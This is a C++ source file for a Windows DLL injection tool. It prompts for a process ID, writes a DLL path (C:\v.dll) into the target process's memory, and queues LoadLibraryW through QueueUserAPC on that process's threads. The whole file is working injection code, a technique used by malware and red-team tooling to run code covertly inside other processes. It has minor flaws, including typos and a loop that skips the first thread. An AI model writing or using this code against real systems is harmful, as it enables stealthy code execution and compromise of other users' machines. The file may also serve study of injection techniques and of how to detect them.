// DLLInjection-QueueUserAPC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

int injectIntoPID(int process)
{
	DWORD pid = (DWORD)process;
	// const char* dll = "C:\\v.dll";
	PCWSTR pszLibFile = L"C:\\v.dll";
	int cb = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);


	//Gets the process handle for the target process
	HANDLE hProcess = OpenProcess(
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, pid);
	if (hProcess == NULL)
	{
		printf(TEXT("[-] Error: Could not open process for PID (%d).\n"), pid);
		return(1);
	}


	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		printf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), pid);
		return(1);
	}

	LPVOID pfnThreadRtn = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	if (pfnThreadRtn == NULL)
	{
		printf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));
		return(1);
	}

	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, cb, NULL);
	if (n == 0)
	{
		printf(TEXT("[-] Error: Could not write any bytes into the PID (%d) address space.\n"), pid);
		return(1);
	}

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		printf(TEXT("[-] Error: Unable to get thread information\n"));
		return(1);
	}

	DWORD threadId = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	BOOL bResult = Thread32First(hSnapshot, &threadEntry);
	while (bResult)

	{
		bResult = Thread32Next(hSnapshot, &threadEntry);
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == pid)
			{
				threadId = threadEntry.th32ThreadID;

				printf(TEXT("[+] Using thread: %i\n"), threadId);
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
				if (hThread == NULL)
					printf(TEXT("[-] Error: Can't open thread. Continuing to try other threads...\n"));
				else
				{
					DWORD dwResult = QueueUserAPC((PAPCFUNC)pfnThreadRtn, hThread, (ULONG_PTR)pszLibFileRemote);
					if (!dwResult)
						printf(TEXT("[-] Error: Couldn't call QueueUserAPC on thread> Continuing to try othrt threads...\n"));
					else
						printf(TEXT("[+] Success: DLL injected via QueueUserAPC().\n"));
					getchar();
					CloseHandle(hThread);
				}
			}
		}
	}

	if (!threadId)
		printf(TEXT("[-] Error: No threads found in thr target process\n"));

	CloseHandle(hSnapshot);
	CloseHandle(hProcess);

	return(0);
}

int main(int argc, char* argv)
{
	int pid;
	puts("Inject into which PID: ");
	scanf_s("%u", &pid);
	puts("Method used to attach thread is : QueueUserAPC");
	int result = injectIntoPID(pid);
	if (result == -1)
	{
		puts("Could not inject into PID");
	}
	system("pause");
}
